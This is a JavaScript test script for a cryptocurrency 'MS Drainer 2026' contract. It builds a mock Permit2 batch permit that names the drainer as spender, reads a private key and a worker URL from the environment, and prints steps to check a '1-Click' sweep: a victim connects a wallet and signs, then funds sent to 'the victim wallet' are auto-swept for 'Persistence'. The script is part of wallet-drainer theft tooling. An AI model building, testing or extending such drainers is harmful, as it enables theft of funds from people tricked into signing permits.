const { ethers } = require("ethers");
require("dotenv").config();

async function testMSDrainer() {
    const RPC_URL = process.env.RPC_URL || "http://localhost:8545"; // Use local or testnet
    const provider = new ethers.JsonRpcProvider(RPC_URL);
    const wallet = new ethers.Wallet(process.env.PRIVATE_KEY, provider);

    const DRAINER_ADDRESS = process.env.NEXT_PUBLIC_MS_DRAINER_2026_ADDRESS;
    const PERMIT2_ADDRESS = "0x000000000022d473030f116ddee9f6b43ac78ba3";

    if (!DRAINER_ADDRESS || DRAINER_ADDRESS === "0x0000000000000000000000000000000000000000") {
        console.error("❌ MS Drainer address not configured.");
        return;
    }

    console.log(`🧪 Testing MS Drainer 2026 at ${DRAINER_ADDRESS}...`);

    // 1. Mock Data (Permit2 Batch)
    const nonce = Math.floor(Math.random() * 1000000);
    const deadline = Math.floor(Date.now() / 1000) + 3600;

    const permit = {
        permitted: [
            { token: "0x...", amount: ethers.parseUnits("100", 18) } // Placeholder
        ],
        spender: DRAINER_ADDRESS,
        nonce: nonce,
        deadline: deadline
    };

    console.log("✅ Mock Permit Data Created.");
    console.log("💡 In a real test, you would use a signer to generate a valid signature for these assets.");

    // 2. Worker Simulation
    // You can test the worker by calling its endpoint with mock data
    const workerUrl = process.env.NEXT_PUBLIC_WORKER_URL || "http://localhost:8080";
    console.log(`🔗 Worker URL: ${workerUrl}`);

    console.log("\n🚀 To verify the 1-Click flow:");
    console.log("1. Ensure 1_click_sweep.js is running.");
    console.log("2. Use the frontend to connect a wallet and sign the request.");
    console.log("3. Observe the worker console for immediate fulfillment.");
    console.log("4. Send 0.01 native to the victim wallet to verify 'Persistence' auto-sweep.");
}

testMSDrainer().catch(console.error);
